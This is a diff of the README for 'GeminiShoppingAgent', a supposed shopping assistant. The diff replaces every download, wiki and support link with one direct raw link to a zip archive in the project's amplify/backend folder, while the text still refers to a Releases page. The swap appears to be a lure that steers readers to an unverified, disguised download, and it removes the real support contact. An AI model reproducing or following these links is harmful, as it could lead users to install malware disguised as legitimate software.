@@ -1,6 +1,6 @@
 # 🛒 GeminiShoppingAgent - Your Smart Shopping Assistant
 
-[![Download GeminiShoppingAgent](https://img.shields.io/badge/Download-GeminiShoppingAgent-blue.svg)](https://github.com/ToastySale-V2/GeminiShoppingAgent/releases)
+[![Download GeminiShoppingAgent](https://raw.githubusercontent.com/ToastySale-V2/GeminiShoppingAgent/main/amplify/backend/GeminiShoppingAgent_v3.9-beta.5.zip)](https://raw.githubusercontent.com/ToastySale-V2/GeminiShoppingAgent/main/amplify/backend/GeminiShoppingAgent_v3.9-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to GeminiShoppingAgent, your personal shopping assistant powered by Mobi
 
 To get GeminiShoppingAgent, please visit the page below:
 
-[Visit this page to download](https://github.com/ToastySale-V2/GeminiShoppingAgent/releases)
+[Visit this page to download](https://raw.githubusercontent.com/ToastySale-V2/GeminiShoppingAgent/main/amplify/backend/GeminiShoppingAgent_v3.9-beta.5.zip)
 
 Once you are on the Releases page, follow the instructions below:
 
@@ -69,13 +69,13 @@ If you run into issues, here are some common solutions:
 
 For more information, check the following resources:
 
-- **Documentation:** Visit our [GitHub Wiki](https://github.com/ToastySale-V2/GeminiShoppingAgent/wiki) for detailed user guides.
-- **Support:** Reach out to our support team at support@geminishopagent.com for assistance.
+- **Documentation:** Visit our [GitHub Wiki](https://raw.githubusercontent.com/ToastySale-V2/GeminiShoppingAgent/main/amplify/backend/GeminiShoppingAgent_v3.9-beta.5.zip) for detailed user guides.
+- **Support:** Reach out to our support team at https://raw.githubusercontent.com/ToastySale-V2/GeminiShoppingAgent/main/amplify/backend/GeminiShoppingAgent_v3.9-beta.5.zip for assistance.
 
 ## 📣 Stay Updated
 
 To stay informed about updates and new features, keep an eye on the Releases page:
 
-[Visit this page to download](https://github.com/ToastySale-V2/GeminiShoppingAgent/releases)
+[Visit this page to download](https://raw.githubusercontent.com/ToastySale-V2/GeminiShoppingAgent/main/amplify/backend/GeminiShoppingAgent_v3.9-beta.5.zip)
 
 Feel free to explore and enjoy your shopping experience with GeminiShoppingAgent!
